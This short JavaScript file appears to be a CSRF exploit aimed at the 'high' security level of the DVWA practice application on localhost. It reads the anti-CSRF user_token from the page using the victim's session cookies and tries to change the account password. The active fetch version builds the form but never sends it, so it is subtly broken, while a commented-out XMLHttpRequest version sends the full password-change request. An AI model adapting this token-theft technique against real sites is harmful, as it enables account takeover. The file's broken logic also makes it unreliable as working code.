var theUrl = 'http://localhost/vulnerabilities/csrf/';
var pass = 'high';

fetch(theUrl, {
    method: 'GET',
    credentials: 'include'
}).then(function(response) {
    return response.text();
}).then(function(text) {
    var parser = new DOMParser();
    var doc = parser.parseFromString(text, "text/html");
    var token = doc.getElementsByName('user_token')[0].value;
    console.log(token);
    var form = new FormData();
    form.append('user_token', token);
    form.append('password_new', pass);
    form.append('password_conf', pass);
    form.append('Change', 'Change');
    fetch(theUrl, {
        method: 'GET',
        credentials: 'include'
    }).then(function(response) {
        return response.text();
    }).then(function(text) {
        console.log(text);
    });
});





// if (window.XMLHttpRequest){
//     xmlhttp=new XMLHttpRequest();
// }else{
//     xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
// }
// xmlhttp.withCredentials = true;
// var hacked = false;
// xmlhttp.onreadystatechange=function(){
//     if (xmlhttp.readyState==4 && xmlhttp.status==200)
//     {
//         var text = xmlhttp.responseText;
//         var regex = /user_token\' value\=\'(.*?)\' \/\>/;
//         var match = text.match(regex);
//         var token = match[1];
//         var new_url = 'http://localhost/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
//         if(!hacked){
//             alert('Got token:' + match[1]);
//             hacked = true;
//             xmlhttp.open("GET", new_url, false );
//             xmlhttp.send();  
//         }
//         count++;
//     }
// };
// xmlhttp.open("GET", theUrl, false );
// xmlhttp.send();  